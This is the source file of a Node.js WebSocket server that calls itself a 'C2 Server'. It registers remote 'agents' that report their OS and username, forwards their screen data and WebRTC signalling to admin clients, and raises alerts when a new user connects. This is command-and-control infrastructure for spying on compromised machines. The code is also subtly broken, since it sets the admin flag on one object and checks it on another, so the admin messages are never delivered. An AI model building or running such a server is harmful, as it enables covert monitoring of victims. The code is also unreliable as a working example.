const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Store active sessions: ID -> { ws, info, isAdmin }
let clients = {};

// Serve admin.html from the current directory
app.use(express.static(path.join(__dirname))); 

wss.on('connection', (ws) => {
    const id = uuidv4().substr(0, 8);
    clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };

    console.log(`[+] Client Connected: ${id}`);

    // Send registration confirmation back to the client
    ws.send(JSON.stringify({ type: 'registered', id: id }));

    ws.on('message', (msg) => {
        try {
            const data = JSON.parse(msg);

            // Check if this is an Admin connecting
            if (data.type === 'register_admin') {
                clients[id].isAdmin = true;
                console.log(`[ADMIN] Connected with ID: ${id}`);
                return;
            }

            // If it's an agent reporting in
            if (data.type === 'info') {
                clients[id].info = data;
                clients[id].lastSeen = Date.now();
                
                // Notify all admins about the new user
                notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
                
                // ALSO broadcast the info directly to admins so they appear in the grid immediately
                // This ensures the frontend 'users' object gets updated via the 'info' type handler
                broadcastToAdmin(id, data); 
            } 
            // Forward signaling data (Offer/Answer/Candidate) between users
            else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                forwardToTarget(id, data);
            }
            // General data broadcast (e.g., screen_data, ping)
            else {
                broadcastToAdmin(id, data);
            }
        } catch (e) {
            console.error("Message parsing error:", e);
        }
    });

    ws.on('close', () => {
        delete clients[id];
        notifyAdmin(id, '🔴 User Disconnected');
    });
});

function notifyAdmin(id, msg) {
    console.log(`[ADMIN ALERT] ${msg}`);
    // Broadcast to all admins
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
        }
    });
}

function broadcastToAdmin(id, data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, ...data }));
        }
    });
}

function forwardToTarget(sourceId, data) {
    // If the data contains a specific target ID, send it there
    if (data.targetId && clients[data.targetId]) {
        const targetWs = clients[data.targetId].ws;
        if (targetWs.readyState === WebSocket.OPEN) {
            targetWs.send(JSON.stringify(data));
        }
    }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`C2 Server running on port ${PORT}`);
});
